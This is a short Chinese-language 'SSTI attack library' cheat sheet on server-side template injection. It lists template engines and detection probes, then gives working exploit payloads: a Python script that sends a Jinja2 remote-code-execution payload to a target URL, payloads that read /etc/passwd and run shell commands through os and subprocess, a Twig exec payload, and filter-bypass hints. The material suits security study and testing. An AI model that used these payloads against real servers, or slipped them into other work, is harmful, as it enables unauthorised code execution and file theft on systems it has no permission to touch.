# SSTI攻击库

## 漏洞描述

服务器端模板注入（SSTI）允许攻击者在服务器端模板引擎中执行任意代码。

## 常见模板引擎

1. **Jinja2** (Python/Flask)
2. **Django Templates** (Python/Django)
3. **Twig** (PHP)
4. **Freemarker** (Java)
5. **Velocity** (Java)

## 检测方法

1. **基础探测**：`{{ 7*7 }}` → 如果返回49，可能存在SSTI
2. **确认引擎**：
   - Jinja2: `{{ config }}`
   - Twig: `{{ _self.env }}`
   - Freemarker: `${7*7}`

## 利用示例

### 案例1: Jinja2 RCE

```python
import requests

url = "http://target.com/page"
payload = "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"
response = requests.get(url, params={"name": payload})
print(response.text)
```

### 案例2: Jinja2读取文件

```python
payload = "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
```

### 案例3: Jinja2命令执行

```python
# 方法1: 通过subprocess
payload = "{{ config.__class__.__init__.__globals__['subprocess'].Popen('ls',shell=True,stdout=-1).communicate()[0] }}"

# 方法2: 通过os.system
payload = "{{ config.__class__.__init__.__globals__['os'].system('id') }}"
```

### 案例4: Twig RCE

```php
// Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

## 绕过技巧

1. **编码绕过**：URL编码、十六进制编码
2. **过滤器绕过**：使用不同的过滤器组合
3. **沙箱逃逸**：利用Python内置类和函数

